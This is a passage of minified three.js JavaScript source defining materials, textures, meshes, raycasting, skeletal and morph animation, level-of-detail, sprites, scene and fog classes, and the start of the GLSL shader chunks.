e={metadata:{version:4.2,type:"material",generator:"MaterialExporter"},uuid:this.uuid,type:this.type,materials:[]},t=0,r=this.materials.length;r>t;t++)e.materials.push(this.materials[t].toJSON());return e},clone:function(){for(var e=new THREE.MeshFaceMaterial,t=0;t<this.materials.length;t++)e.materials.push(this.materials[t].clone());return e}},THREE.PointCloudMaterial=function(e){THREE.Material.call(this),this.type="PointCloudMaterial",this.color=new THREE.Color(16777215),this.map=null,this.size=1,this.sizeAttenuation=!0,this.vertexColors=THREE.NoColors,this.fog=!0,this.setValues(e)},THREE.PointCloudMaterial.prototype=Object.create(THREE.Material.prototype),THREE.PointCloudMaterial.prototype.constructor=THREE.PointCloudMaterial,THREE.PointCloudMaterial.prototype.clone=function(){var e=new THREE.PointCloudMaterial;return THREE.Material.prototype.clone.call(this,e),e.color.copy(this.color),e.map=this.map,e.size=this.size,e.sizeAttenuation=this.sizeAttenuation,e.vertexColors=this.vertexColors,e.fog=this.fog,e},THREE.ParticleBasicMaterial=function(e){return THREE.warn("THREE.ParticleBasicMaterial has been renamed to THREE.PointCloudMaterial."),new THREE.PointCloudMaterial(e)},THREE.ParticleSystemMaterial=function(e){return THREE.warn("THREE.ParticleSystemMaterial has been renamed to THREE.PointCloudMaterial."),new THREE.PointCloudMaterial(e)},THREE.ShaderMaterial=function(e){THREE.Material.call(this),this.type="ShaderMaterial",this.defines={},this.uniforms={},this.attributes=null,this.vertexShader="void main() {\n	gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );\n}",this.fragmentShader="void main() {\n	gl_FragColor = vec4( 1.0, 0.0, 0.0, 1.0 );\n}",this.shading=THREE.SmoothShading,this.linewidth=1,this.wireframe=!1,this.wireframeLinewidth=1,this.fog=!1,this.lights=!1,this.vertexColors=THREE.NoColors,this.skinning=!1,this.morphTargets=!1,this.morphNormals=!1,this.defaultAttributeValues={color:[1,1,1],uv:[0,0],uv2:[0,0]},this.index0AttributeName=void 0,this.setValues(e)},THREE.ShaderMaterial.prototype=Object.create(THREE.Material.prototype),THREE.ShaderMaterial.prototype.constructor=THREE.ShaderMaterial,THREE.ShaderMaterial.prototype.clone=function(){var e=new THREE.ShaderMaterial;return THREE.Material.prototype.clone.call(this,e),e.fragmentShader=this.fragmentShader,e.vertexShader=this.vertexShader,e.uniforms=THREE.UniformsUtils.clone(this.uniforms),e.attributes=this.attributes,e.defines=this.defines,e.shading=this.shading,e.wireframe=this.wireframe,e.wireframeLinewidth=this.wireframeLinewidth,e.fog=this.fog,e.lights=this.lights,e.vertexColors=this.vertexColors,e.skinning=this.skinning,e.morphTargets=this.morphTargets,e.morphNormals=this.morphNormals,e},THREE.RawShaderMaterial=function(e){THREE.ShaderMaterial.call(this,e),this.type="RawShaderMaterial"},THREE.RawShaderMaterial.prototype=Object.create(THREE.ShaderMaterial.prototype),THREE.RawShaderMaterial.prototype.constructor=THREE.RawShaderMaterial,THREE.RawShaderMaterial.prototype.clone=function(){var e=new THREE.RawShaderMaterial;return THREE.ShaderMaterial.prototype.clone.call(this,e),e},THREE.SpriteMaterial=function(e){THREE.Material.call(this),this.type="SpriteMaterial",this.color=new THREE.Color(16777215),this.map=null,this.rotation=0,this.fog=!1,this.setValues(e)},THREE.SpriteMaterial.prototype=Object.create(THREE.Material.prototype),THREE.SpriteMaterial.prototype.constructor=THREE.SpriteMaterial,THREE.SpriteMaterial.prototype.clone=function(){var e=new THREE.SpriteMaterial;return THREE.Material.prototype.clone.call(this,e),e.color.copy(this.color),e.map=this.map,e.rotation=this.rotation,e.fog=this.fog,e},THREE.Texture=function(e,t,r,i,n,a,o,s,h){Object.defineProperty(this,"id",{value:THREE.TextureIdCount++}),this.uuid=THREE.Math.generateUUID(),this.name="",this.sourceFile="",this.image=void 0!==e?e:THREE.Texture.DEFAULT_IMAGE,this.mipmaps=[],this.mapping=void 0!==t?t:THREE.Texture.DEFAULT_MAPPING,this.wrapS=void 0!==r?r:THREE.ClampToEdgeWrapping,this.wrapT=void 0!==i?i:THREE.ClampToEdgeWrapping,this.magFilter=void 0!==n?n:THREE.LinearFilter,this.minFilter=void 0!==a?a:THREE.LinearMipMapLinearFilter,this.anisotropy=void 0!==h?h:1,this.format=void 0!==o?o:THREE.RGBAFormat,this.type=void 0!==s?s:THREE.UnsignedByteType,this.offset=new THREE.Vector2(0,0),this.repeat=new THREE.Vector2(1,1),this.generateMipmaps=!0,this.premultiplyAlpha=!1,this.flipY=!0,this.unpackAlignment=4,this._needsUpdate=!1,this.onUpdate=null},THREE.Texture.DEFAULT_IMAGE=void 0,THREE.Texture.DEFAULT_MAPPING=THREE.UVMapping,THREE.Texture.prototype={constructor:THREE.Texture,get needsUpdate(){return this._needsUpdate},set needsUpdate(e){e===!0&&this.update(),this._needsUpdate=e},clone:function(e){return void 0===e&&(e=new THREE.Texture),e.image=this.image,e.mipmaps=this.mipmaps.slice(0),e.mapping=this.mapping,e.wrapS=this.wrapS,e.wrapT=this.wrapT,e.magFilter=this.magFilter,e.minFilter=this.minFilter,e.anisotropy=this.anisotropy,e.format=this.format,e.type=this.type,e.offset.copy(this.offset),e.repeat.copy(this.repeat),e.generateMipmaps=this.generateMipmaps,e.premultiplyAlpha=this.premultiplyAlpha,e.flipY=this.flipY,e.unpackAlignment=this.unpackAlignment,e},update:function(){this.dispatchEvent({type:"update"})},dispose:function(){this.dispatchEvent({type:"dispose"})}},THREE.EventDispatcher.prototype.apply(THREE.Texture.prototype),THREE.TextureIdCount=0,THREE.CubeTexture=function(e,t,r,i,n,a,o,s,h){t=void 0!==t?t:THREE.CubeReflectionMapping,THREE.Texture.call(this,e,t,r,i,n,a,o,s,h),this.images=e},THREE.CubeTexture.prototype=Object.create(THREE.Texture.prototype),THREE.CubeTexture.prototype.constructor=THREE.CubeTexture,THREE.CubeTexture.clone=function(e){return void 0===e&&(e=new THREE.CubeTexture),THREE.Texture.prototype.clone.call(this,e),e.images=this.images,e},THREE.CompressedTexture=function(e,t,r,i,n,a,o,s,h,l,c){THREE.Texture.call(this,null,a,o,s,h,l,i,n,c),this.image={width:t,height:r},this.mipmaps=e,this.flipY=!1,this.generateMipmaps=!1},THREE.CompressedTexture.prototype=Object.create(THREE.Texture.prototype),THREE.CompressedTexture.prototype.constructor=THREE.CompressedTexture,THREE.CompressedTexture.prototype.clone=function(){var e=new THREE.CompressedTexture;return THREE.Texture.prototype.clone.call(this,e),e},THREE.DataTexture=function(e,t,r,i,n,a,o,s,h,l,c){THREE.Texture.call(this,null,a,o,s,h,l,i,n,c),this.image={data:e,width:t,height:r}},THREE.DataTexture.prototype=Object.create(THREE.Texture.prototype),THREE.DataTexture.prototype.constructor=THREE.DataTexture,THREE.DataTexture.prototype.clone=function(){var e=new THREE.DataTexture;return THREE.Texture.prototype.clone.call(this,e),e},THREE.VideoTexture=function(e,t,r,i,n,a,o,s,h){THREE.Texture.call(this,e,t,r,i,n,a,o,s,h),this.generateMipmaps=!1;var l=this,c=function(){requestAnimationFrame(c),e.readyState===e.HAVE_ENOUGH_DATA&&(l.needsUpdate=!0)};c()},THREE.VideoTexture.prototype=Object.create(THREE.Texture.prototype),THREE.VideoTexture.prototype.constructor=THREE.VideoTexture,THREE.Group=function(){THREE.Object3D.call(this),this.type="Group"},THREE.Group.prototype=Object.create(THREE.Object3D.prototype),THREE.Group.prototype.constructor=THREE.Group,THREE.PointCloud=function(e,t){THREE.Object3D.call(this),this.type="PointCloud",this.geometry=void 0!==e?e:new THREE.Geometry,this.material=void 0!==t?t:new THREE.PointCloudMaterial({color:16777215*Math.random()})},THREE.PointCloud.prototype=Object.create(THREE.Object3D.prototype),THREE.PointCloud.prototype.constructor=THREE.PointCloud,THREE.PointCloud.prototype.raycast=function(){var e=new THREE.Matrix4,t=new THREE.Ray;return function(r,i){var n=this,a=n.geometry,o=r.params.PointCloud.threshold;if(e.getInverse(this.matrixWorld),t.copy(r.ray).applyMatrix4(e),null===a.boundingBox||t.isIntersectionBox(a.boundingBox)!==!1){var s=o/((this.scale.x+this.scale.y+this.scale.z)/3),h=new THREE.Vector3,l=function(e,a){var o=t.distanceToPoint(e);if(s>o){var h=t.closestPointToPoint(e);h.applyMatrix4(n.matrixWorld);var l=r.ray.origin.distanceTo(h);i.push({distance:l,distanceToRay:o,point:h.clone(),index:a,face:null,object:n})}};if(a instanceof THREE.BufferGeometry){var c=a.attributes,u=c.position.array;if(void 0!==c.index){var E=c.index.array,f=a.offsets;if(0===f.length){var p={start:0,count:E.length,index:0};f=[p]}for(var d=0,m=f.length;m>d;++d)for(var T=f[d].start,g=f[d].count,v=f[d].index,R=T,y=T+g;y>R;R++){var H=v+E[R];h.fromArray(u,3*H),l(h,H)}}else for(var x=u.length/3,R=0;x>R;R++)h.set(u[3*R],u[3*R+1],u[3*R+2]),l(h,R)}else for(var b=this.geometry.vertices,R=0;R<b.length;R++)l(b[R],R)}}}(),THREE.PointCloud.prototype.clone=function(e){return void 0===e&&(e=new THREE.PointCloud(this.geometry,this.material)),THREE.Object3D.prototype.clone.call(this,e),e},THREE.ParticleSystem=function(e,t){return THREE.warn("THREE.ParticleSystem has been renamed to THREE.PointCloud."),new THREE.PointCloud(e,t)},THREE.Line=function(e,t,r){THREE.Object3D.call(this),this.type="Line",this.geometry=void 0!==e?e:new THREE.Geometry,this.material=void 0!==t?t:new THREE.LineBasicMaterial({color:16777215*Math.random()}),this.mode=void 0!==r?r:THREE.LineStrip},THREE.LineStrip=0,THREE.LinePieces=1,THREE.Line.prototype=Object.create(THREE.Object3D.prototype),THREE.Line.prototype.constructor=THREE.Line,THREE.Line.prototype.raycast=function(){var e=new THREE.Matrix4,t=new THREE.Ray,r=new THREE.Sphere;return function(i,n){var a=i.linePrecision,o=a*a,s=this.geometry;
if(null===s.boundingSphere&&s.computeBoundingSphere(),r.copy(s.boundingSphere),r.applyMatrix4(this.matrixWorld),i.ray.isIntersectionSphere(r)!==!1){e.getInverse(this.matrixWorld),t.copy(i.ray).applyMatrix4(e);var h=new THREE.Vector3,l=new THREE.Vector3,c=new THREE.Vector3,u=new THREE.Vector3,E=this.mode===THREE.LineStrip?1:2;if(s instanceof THREE.BufferGeometry){var f=s.attributes;if(void 0!==f.index){var p=f.index.array,d=f.position.array,m=s.offsets;0===m.length&&(m=[{start:0,count:p.length,index:0}]);for(var T=0;T<m.length;T++)for(var g=m[T].start,v=m[T].count,R=m[T].index,y=g;g+v-1>y;y+=E){var H=R+p[y],x=R+p[y+1];h.fromArray(d,3*H),l.fromArray(d,3*x);var b=t.distanceSqToSegment(h,l,u,c);if(!(b>o)){var _=t.origin.distanceTo(u);_<i.near||_>i.far||n.push({distance:_,point:c.clone().applyMatrix4(this.matrixWorld),index:y,offsetIndex:T,face:null,faceIndex:null,object:this})}}}else for(var d=f.position.array,y=0;y<d.length/3-1;y+=E){h.fromArray(d,3*y),l.fromArray(d,3*y+3);var b=t.distanceSqToSegment(h,l,u,c);if(!(b>o)){var _=t.origin.distanceTo(u);_<i.near||_>i.far||n.push({distance:_,point:c.clone().applyMatrix4(this.matrixWorld),index:y,face:null,faceIndex:null,object:this})}}}else if(s instanceof THREE.Geometry)for(var w=s.vertices,M=w.length,y=0;M-1>y;y+=E){var b=t.distanceSqToSegment(w[y],w[y+1],u,c);if(!(b>o)){var _=t.origin.distanceTo(u);_<i.near||_>i.far||n.push({distance:_,point:c.clone().applyMatrix4(this.matrixWorld),index:y,face:null,faceIndex:null,object:this})}}}}}(),THREE.Line.prototype.clone=function(e){return void 0===e&&(e=new THREE.Line(this.geometry,this.material,this.mode)),THREE.Object3D.prototype.clone.call(this,e),e},THREE.Mesh=function(e,t){THREE.Object3D.call(this),this.type="Mesh",this.geometry=void 0!==e?e:new THREE.Geometry,this.material=void 0!==t?t:new THREE.MeshBasicMaterial({color:16777215*Math.random()}),this.updateMorphTargets()},THREE.Mesh.prototype=Object.create(THREE.Object3D.prototype),THREE.Mesh.prototype.constructor=THREE.Mesh,THREE.Mesh.prototype.updateMorphTargets=function(){if(void 0!==this.geometry.morphTargets&&this.geometry.morphTargets.length>0){this.morphTargetBase=-1,this.morphTargetForcedOrder=[],this.morphTargetInfluences=[],this.morphTargetDictionary={};for(var e=0,t=this.geometry.morphTargets.length;t>e;e++)this.morphTargetInfluences.push(0),this.morphTargetDictionary[this.geometry.morphTargets[e].name]=e}},THREE.Mesh.prototype.getMorphTargetIndexByName=function(e){return void 0!==this.morphTargetDictionary[e]?this.morphTargetDictionary[e]:(THREE.warn("THREE.Mesh.getMorphTargetIndexByName: morph target "+e+" does not exist. Returning 0."),0)},THREE.Mesh.prototype.raycast=function(){var e=new THREE.Matrix4,t=new THREE.Ray,r=new THREE.Sphere,i=new THREE.Vector3,n=new THREE.Vector3,a=new THREE.Vector3;return function(o,s){var h=this.geometry;if(null===h.boundingSphere&&h.computeBoundingSphere(),r.copy(h.boundingSphere),r.applyMatrix4(this.matrixWorld),o.ray.isIntersectionSphere(r)!==!1&&(e.getInverse(this.matrixWorld),t.copy(o.ray).applyMatrix4(e),null===h.boundingBox||t.isIntersectionBox(h.boundingBox)!==!1))if(h instanceof THREE.BufferGeometry){var l=this.material;if(void 0===l)return;var c,u,E,f=h.attributes,p=o.precision;if(void 0!==f.index){var d=f.index.array,m=f.position.array,T=h.offsets;0===T.length&&(T=[{start:0,count:d.length,index:0}]);for(var g=0,v=T.length;v>g;++g)for(var R=T[g].start,y=T[g].count,H=T[g].index,x=R,b=R+y;b>x;x+=3){if(c=H+d[x],u=H+d[x+1],E=H+d[x+2],i.fromArray(m,3*c),n.fromArray(m,3*u),a.fromArray(m,3*E),l.side===THREE.BackSide)var _=t.intersectTriangle(a,n,i,!0);else var _=t.intersectTriangle(i,n,a,l.side!==THREE.DoubleSide);if(null!==_){_.applyMatrix4(this.matrixWorld);var w=o.ray.origin.distanceTo(_);p>w||w<o.near||w>o.far||s.push({distance:w,point:_,face:new THREE.Face3(c,u,E,THREE.Triangle.normal(i,n,a)),faceIndex:null,object:this})}}}else for(var m=f.position.array,x=0,M=0,b=m.length;b>x;x+=3,M+=9){if(c=x,u=x+1,E=x+2,i.fromArray(m,M),n.fromArray(m,M+3),a.fromArray(m,M+6),l.side===THREE.BackSide)var _=t.intersectTriangle(a,n,i,!0);else var _=t.intersectTriangle(i,n,a,l.side!==THREE.DoubleSide);if(null!==_){_.applyMatrix4(this.matrixWorld);var w=o.ray.origin.distanceTo(_);p>w||w<o.near||w>o.far||s.push({distance:w,point:_,face:new THREE.Face3(c,u,E,THREE.Triangle.normal(i,n,a)),faceIndex:null,object:this})}}}else if(h instanceof THREE.Geometry)for(var c,u,E,S=this.material instanceof THREE.MeshFaceMaterial,A=S===!0?this.material.materials:null,p=o.precision,C=h.vertices,L=0,P=h.faces.length;P>L;L++){var F=h.faces[L],l=S===!0?A[F.materialIndex]:this.material;if(void 0!==l){if(c=C[F.a],u=C[F.b],E=C[F.c],l.morphTargets===!0){var U=h.morphTargets,B=this.morphTargetInfluences;i.set(0,0,0),n.set(0,0,0),a.set(0,0,0);for(var D=0,V=U.length;V>D;D++){var z=B[D];if(0!==z){var k=U[D].vertices;i.x+=(k[F.a].x-c.x)*z,i.y+=(k[F.a].y-c.y)*z,i.z+=(k[F.a].z-c.z)*z,n.x+=(k[F.b].x-u.x)*z,n.y+=(k[F.b].y-u.y)*z,n.z+=(k[F.b].z-u.z)*z,a.x+=(k[F.c].x-E.x)*z,a.y+=(k[F.c].y-E.y)*z,a.z+=(k[F.c].z-E.z)*z}}i.add(c),n.add(u),a.add(E),c=i,u=n,E=a}if(l.side===THREE.BackSide)var _=t.intersectTriangle(E,u,c,!0);else var _=t.intersectTriangle(c,u,E,l.side!==THREE.DoubleSide);if(null!==_){_.applyMatrix4(this.matrixWorld);var w=o.ray.origin.distanceTo(_);p>w||w<o.near||w>o.far||s.push({distance:w,point:_,face:F,faceIndex:L,object:this})}}}}}(),THREE.Mesh.prototype.clone=function(e,t){return void 0===e&&(e=new THREE.Mesh(this.geometry,this.material)),THREE.Object3D.prototype.clone.call(this,e,t),e},THREE.Bone=function(e){THREE.Object3D.call(this),this.type="Bone",this.skin=e},THREE.Bone.prototype=Object.create(THREE.Object3D.prototype),THREE.Bone.prototype.constructor=THREE.Bone,THREE.Skeleton=function(e,t,r){if(this.useVertexTexture=void 0!==r?r:!0,this.identityMatrix=new THREE.Matrix4,e=e||[],this.bones=e.slice(0),this.useVertexTexture){var i;i=this.bones.length>256?64:this.bones.length>64?32:this.bones.length>16?16:8,this.boneTextureWidth=i,this.boneTextureHeight=i,this.boneMatrices=new Float32Array(this.boneTextureWidth*this.boneTextureHeight*4),this.boneTexture=new THREE.DataTexture(this.boneMatrices,this.boneTextureWidth,this.boneTextureHeight,THREE.RGBAFormat,THREE.FloatType),this.boneTexture.minFilter=THREE.NearestFilter,this.boneTexture.magFilter=THREE.NearestFilter,this.boneTexture.generateMipmaps=!1,this.boneTexture.flipY=!1}else this.boneMatrices=new Float32Array(16*this.bones.length);if(void 0===t)this.calculateInverses();else if(this.bones.length===t.length)this.boneInverses=t.slice(0);else{THREE.warn("THREE.Skeleton bonInverses is the wrong length."),this.boneInverses=[];for(var n=0,a=this.bones.length;a>n;n++)this.boneInverses.push(new THREE.Matrix4)}},THREE.Skeleton.prototype.calculateInverses=function(){this.boneInverses=[];for(var e=0,t=this.bones.length;t>e;e++){var r=new THREE.Matrix4;this.bones[e]&&r.getInverse(this.bones[e].matrixWorld),this.boneInverses.push(r)}},THREE.Skeleton.prototype.pose=function(){for(var e,t=0,r=this.bones.length;r>t;t++)e=this.bones[t],e&&e.matrixWorld.getInverse(this.boneInverses[t]);for(var t=0,r=this.bones.length;r>t;t++)e=this.bones[t],e&&(e.parent?(e.matrix.getInverse(e.parent.matrixWorld),e.matrix.multiply(e.matrixWorld)):e.matrix.copy(e.matrixWorld),e.matrix.decompose(e.position,e.quaternion,e.scale))},THREE.Skeleton.prototype.update=function(){var e=new THREE.Matrix4;return function(){for(var t=0,r=this.bones.length;r>t;t++){var i=this.bones[t]?this.bones[t].matrixWorld:this.identityMatrix;e.multiplyMatrices(i,this.boneInverses[t]),e.flattenToArrayOffset(this.boneMatrices,16*t)}this.useVertexTexture&&(this.boneTexture.needsUpdate=!0)}}(),THREE.SkinnedMesh=function(e,t,r){THREE.Mesh.call(this,e,t),this.type="SkinnedMesh",this.bindMode="attached",this.bindMatrix=new THREE.Matrix4,this.bindMatrixInverse=new THREE.Matrix4;var i=[];if(this.geometry&&void 0!==this.geometry.bones){for(var n,a,o,s,h,l=0,c=this.geometry.bones.length;c>l;++l)a=this.geometry.bones[l],o=a.pos,s=a.rotq,h=a.scl,n=new THREE.Bone(this),i.push(n),n.name=a.name,n.position.set(o[0],o[1],o[2]),n.quaternion.set(s[0],s[1],s[2],s[3]),void 0!==h?n.scale.set(h[0],h[1],h[2]):n.scale.set(1,1,1);for(var l=0,c=this.geometry.bones.length;c>l;++l)a=this.geometry.bones[l],-1!==a.parent?i[a.parent].add(i[l]):this.add(i[l])}this.normalizeSkinWeights(),this.updateMatrixWorld(!0),this.bind(new THREE.Skeleton(i,void 0,r))},THREE.SkinnedMesh.prototype=Object.create(THREE.Mesh.prototype),THREE.SkinnedMesh.prototype.constructor=THREE.SkinnedMesh,THREE.SkinnedMesh.prototype.bind=function(e,t){this.skeleton=e,void 0===t&&(this.updateMatrixWorld(!0),t=this.matrixWorld),this.bindMatrix.copy(t),this.bindMatrixInverse.getInverse(t)},THREE.SkinnedMesh.prototype.pose=function(){this.skeleton.pose()},THREE.SkinnedMesh.prototype.normalizeSkinWeights=function(){if(this.geometry instanceof THREE.Geometry)for(var e=0;e<this.geometry.skinIndices.length;e++){var t=this.geometry.skinWeights[e],r=1/t.lengthManhattan();r!==1/0?t.multiplyScalar(r):t.set(1)}},THREE.SkinnedMesh.prototype.updateMatrixWorld=function(e){THREE.Mesh.prototype.updateMatrixWorld.call(this,!0),"attached"===this.bindMode?this.bindMatrixInverse.getInverse(this.matrixWorld):"detached"===this.bindMode?this.bindMatrixInverse.getInverse(this.bindMatrix):THREE.warn("THREE.SkinnedMesh unreckognized bindMode: "+this.bindMode)},THREE.SkinnedMesh.prototype.clone=function(e){return void 0===e&&(e=new THREE.SkinnedMesh(this.geometry,this.material,this.useVertexTexture)),THREE.Mesh.prototype.clone.call(this,e),e},THREE.MorphAnimMesh=function(e,t){THREE.Mesh.call(this,e,t),this.type="MorphAnimMesh",this.duration=1e3,this.mirroredLoop=!1,this.time=0,this.lastKeyframe=0,this.currentKeyframe=0,this.direction=1,this.directionBackwards=!1,this.setFrameRange(0,this.geometry.morphTargets.length-1)},THREE.MorphAnimMesh.prototype=Object.create(THREE.Mesh.prototype),THREE.MorphAnimMesh.prototype.constructor=THREE.MorphAnimMesh,THREE.MorphAnimMesh.prototype.setFrameRange=function(e,t){this.startKeyframe=e,this.endKeyframe=t,this.length=this.endKeyframe-this.startKeyframe+1},THREE.MorphAnimMesh.prototype.setDirectionForward=function(){this.direction=1,this.directionBackwards=!1},THREE.MorphAnimMesh.prototype.setDirectionBackward=function(){this.direction=-1,this.directionBackwards=!0},THREE.MorphAnimMesh.prototype.parseAnimations=function(){var e=this.geometry;e.animations||(e.animations={});for(var t,r=e.animations,i=/([a-z]+)_?(\d+)/,n=0,a=e.morphTargets.length;a>n;n++){var o=e.morphTargets[n],s=o.name.match(i);if(s&&s.length>1){var h=s[1];r[h]||(r[h]={start:1/0,end:-(1/0)});var l=r[h];n<l.start&&(l.start=n),n>l.end&&(l.end=n),t||(t=h)}}e.firstAnimation=t},THREE.MorphAnimMesh.prototype.setAnimationLabel=function(e,t,r){this.geometry.animations||(this.geometry.animations={}),this.geometry.animations[e]={start:t,end:r}},THREE.MorphAnimMesh.prototype.playAnimation=function(e,t){var r=this.geometry.animations[e];r?(this.setFrameRange(r.start,r.end),this.duration=1e3*((r.end-r.start)/t),this.time=0):THREE.warn("THREE.MorphAnimMesh: animation["+e+"] undefined in .playAnimation()")},THREE.MorphAnimMesh.prototype.updateAnimation=function(e){var t=this.duration/this.length;this.time+=this.direction*e,this.mirroredLoop?(this.time>this.duration||this.time<0)&&(this.direction*=-1,this.time>this.duration&&(this.time=this.duration,this.directionBackwards=!0),this.time<0&&(this.time=0,this.directionBackwards=!1)):(this.time=this.time%this.duration,this.time<0&&(this.time+=this.duration));var r=this.startKeyframe+THREE.Math.clamp(Math.floor(this.time/t),0,this.length-1);r!==this.currentKeyframe&&(this.morphTargetInfluences[this.lastKeyframe]=0,this.morphTargetInfluences[this.currentKeyframe]=1,this.morphTargetInfluences[r]=0,this.lastKeyframe=this.currentKeyframe,this.currentKeyframe=r);var i=this.time%t/t;this.directionBackwards&&(i=1-i),this.morphTargetInfluences[this.currentKeyframe]=i,this.morphTargetInfluences[this.lastKeyframe]=1-i},THREE.MorphAnimMesh.prototype.interpolateTargets=function(e,t,r){for(var i=this.morphTargetInfluences,n=0,a=i.length;a>n;n++)i[n]=0;e>-1&&(i[e]=1-r),t>-1&&(i[t]=r)},THREE.MorphAnimMesh.prototype.clone=function(e){return void 0===e&&(e=new THREE.MorphAnimMesh(this.geometry,this.material)),e.duration=this.duration,e.mirroredLoop=this.mirroredLoop,e.time=this.time,e.lastKeyframe=this.lastKeyframe,e.currentKeyframe=this.currentKeyframe,e.direction=this.direction,e.directionBackwards=this.directionBackwards,THREE.Mesh.prototype.clone.call(this,e),e},THREE.LOD=function(){THREE.Object3D.call(this),this.objects=[]},THREE.LOD.prototype=Object.create(THREE.Object3D.prototype),THREE.LOD.prototype.constructor=THREE.LOD,THREE.LOD.prototype.addLevel=function(e,t){void 0===t&&(t=0),t=Math.abs(t);for(var r=0;r<this.objects.length&&!(t<this.objects[r].distance);r++);this.objects.splice(r,0,{distance:t,object:e}),this.add(e)},THREE.LOD.prototype.getObjectForDistance=function(e){for(var t=1,r=this.objects.length;r>t&&!(e<this.objects[t].distance);t++);return this.objects[t-1].object},THREE.LOD.prototype.raycast=function(){var e=new THREE.Vector3;return function(t,r){e.setFromMatrixPosition(this.matrixWorld);var i=t.ray.origin.distanceTo(e);this.getObjectForDistance(i).raycast(t,r)}}(),THREE.LOD.prototype.update=function(){var e=new THREE.Vector3,t=new THREE.Vector3;return function(r){if(this.objects.length>1){e.setFromMatrixPosition(r.matrixWorld),t.setFromMatrixPosition(this.matrixWorld);var i=e.distanceTo(t);this.objects[0].object.visible=!0;for(var n=1,a=this.objects.length;a>n&&i>=this.objects[n].distance;n++)this.objects[n-1].object.visible=!1,this.objects[n].object.visible=!0;for(;a>n;n++)this.objects[n].object.visible=!1}}}(),THREE.LOD.prototype.clone=function(e){void 0===e&&(e=new THREE.LOD),THREE.Object3D.prototype.clone.call(this,e);for(var t=0,r=this.objects.length;r>t;t++){var i=this.objects[t].object.clone();i.visible=0===t,e.addLevel(i,this.objects[t].distance)}return e},THREE.Sprite=function(){var e=new Uint16Array([0,1,2,0,2,3]),t=new Float32Array([-.5,-.5,0,.5,-.5,0,.5,.5,0,-.5,.5,0]),r=new Float32Array([0,0,1,0,1,1,0,1]),i=new THREE.BufferGeometry;return i.addAttribute("index",new THREE.BufferAttribute(e,1)),i.addAttribute("position",new THREE.BufferAttribute(t,3)),i.addAttribute("uv",new THREE.BufferAttribute(r,2)),function(e){THREE.Object3D.call(this),this.type="Sprite",this.geometry=i,this.material=void 0!==e?e:new THREE.SpriteMaterial}}(),THREE.Sprite.prototype=Object.create(THREE.Object3D.prototype),THREE.Sprite.prototype.constructor=THREE.Sprite,THREE.Sprite.prototype.raycast=function(){var e=new THREE.Vector3;return function(t,r){e.setFromMatrixPosition(this.matrixWorld);var i=t.ray.distanceToPoint(e);i>this.scale.x||r.push({distance:i,point:this.position,face:null,object:this})}}(),THREE.Sprite.prototype.clone=function(e){return void 0===e&&(e=new THREE.Sprite(this.material)),THREE.Object3D.prototype.clone.call(this,e),e},THREE.Particle=THREE.Sprite,THREE.LensFlare=function(e,t,r,i,n){THREE.Object3D.call(this),this.lensFlares=[],this.positionScreen=new THREE.Vector3,this.customUpdateCallback=void 0,void 0!==e&&this.add(e,t,r,i,n)},THREE.LensFlare.prototype=Object.create(THREE.Object3D.prototype),THREE.LensFlare.prototype.constructor=THREE.LensFlare,THREE.LensFlare.prototype.add=function(e,t,r,i,n,a){void 0===t&&(t=-1),void 0===r&&(r=0),void 0===a&&(a=1),void 0===n&&(n=new THREE.Color(16777215)),void 0===i&&(i=THREE.NormalBlending),r=Math.min(r,Math.max(0,r)),this.lensFlares.push({texture:e,size:t,distance:r,x:0,y:0,z:0,scale:1,rotation:1,opacity:a,color:n,blending:i})},THREE.LensFlare.prototype.updateLensFlares=function(){var e,t,r=this.lensFlares.length,i=2*-this.positionScreen.x,n=2*-this.positionScreen.y;for(e=0;r>e;e++)t=this.lensFlares[e],t.x=this.positionScreen.x+i*t.distance,t.y=this.positionScreen.y+n*t.distance,t.wantedRotation=t.x*Math.PI*.25,t.rotation+=.25*(t.wantedRotation-t.rotation)},THREE.Scene=function(){THREE.Object3D.call(this),this.type="Scene",this.fog=null,this.overrideMaterial=null,this.autoUpdate=!0},THREE.Scene.prototype=Object.create(THREE.Object3D.prototype),THREE.Scene.prototype.constructor=THREE.Scene,THREE.Scene.prototype.clone=function(e){return void 0===e&&(e=new THREE.Scene),THREE.Object3D.prototype.clone.call(this,e),null!==this.fog&&(e.fog=this.fog.clone()),null!==this.overrideMaterial&&(e.overrideMaterial=this.overrideMaterial.clone()),e.autoUpdate=this.autoUpdate,e.matrixAutoUpdate=this.matrixAutoUpdate,e},THREE.Fog=function(e,t,r){this.name="",this.color=new THREE.Color(e),this.near=void 0!==t?t:1,this.far=void 0!==r?r:1e3},THREE.Fog.prototype.clone=function(){return new THREE.Fog(this.color.getHex(),this.near,this.far)},THREE.FogExp2=function(e,t){this.name="",this.color=new THREE.Color(e),this.density=void 0!==t?t:25e-5},THREE.FogExp2.prototype.clone=function(){return new THREE.FogExp2(this.color.getHex(),this.density)},THREE.ShaderChunk={},THREE.ShaderChunk.common="#define PI 3.14159\n#define PI2 6.28318\n#define RECIPROCAL_PI2 0.15915494\n#define LOG2 1.442695\n#define EPSILON 1e-6\n\nfloat square( in float a ) { return a*a; }\nvec2  square( in vec2 a )  { return vec2( a.x*a.x, a.y*a.y ); }\nvec3  square( in vec3 a )  { return vec3( a.x*a.x, a.y*a.y, a.z*a.z ); }\nvec4  square( in vec4 a )  { return vec4( a.x*a.x, a.y*a.y, a.z*a.z, a.w*a.w ); }\nfloat saturate( in float a ) { return clamp( a, 0.0, 1.0 ); }\nvec2  saturate( in vec2 a )  { return clamp( a, 0.0, 1.0 ); }\nvec3  saturate( in vec3 a )  { return clamp( a, 0.0, 1.0 ); }\nvec4  saturate( in vec4 a )  { return clamp( a, 0.0, 1.0 ); }\nfloat average( in float a ) { return a; }\nfloat average( in vec2 a )  { return ( a.x + a.y) * 0.5; }\nfloat average( in vec3 a )  { return ( a.x + a.y + a.z) / 3.0; }\nfloat average( in vec4 a )  { return ( a.x + a.y + a.z + a.w) * 0.25; }\nfloat whiteCompliment( in float a ) { return saturate( 1.0 - a ); }\nvec2  whiteCompliment( in vec2 a )  { return saturate( vec2(1.0) - a ); }\nvec3  whiteCompliment( in vec3 a )  { return saturate( vec3(1.0) - a ); }\nvec4  whiteCompliment( in vec4 a )  { return saturate( vec4(1.0) - a ); }\nvec3 transformDirection( in vec3 normal, in mat4 matrix ) {\n	return normalize( ( matrix * vec4( normal, 0.0 ) ).xyz );\n}\n// http://en.wikibooks.org/wiki/GLSL_Programming/Applying_Matrix_Transformations\nvec3 inverseTransformDirection( in vec3 normal, in mat4 matrix ) {\n	return normalize( ( vec4( normal, 0.0 ) * matrix ).xyz 